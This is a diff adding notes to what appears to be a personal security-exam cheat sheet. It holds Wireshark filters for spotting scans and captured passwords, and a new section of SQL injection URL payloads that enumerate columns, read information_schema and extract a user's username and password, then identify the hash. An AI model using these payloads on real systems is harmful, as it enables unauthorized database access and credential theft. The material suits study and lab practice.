@@ -189,5 +189,14 @@ Open the .exe file, look under Optional Header → AddressOfEntryPoint.
 -tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
 -tcp.flags.syn == 1   (Which machine for dos)
 -http.request.method == POST   (for passwords) or click tools ---> credentials
+#SQL Injection 
+•	?id=1' ORDER BY 1--
+            ?id=1' ORDER BY 2--
+             ?id=1' ORDER BY 3--
+•	?id=1' UNION SELECT null, database()--
+•	?id=1' UNION SELECT null, table_name FROM information_schema.tables—
+•	?id=1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'—
+•	?id=1' UNION SELECT username, password FROM users WHERE username='Sarah'--
+•	hashid <hash>
 
 
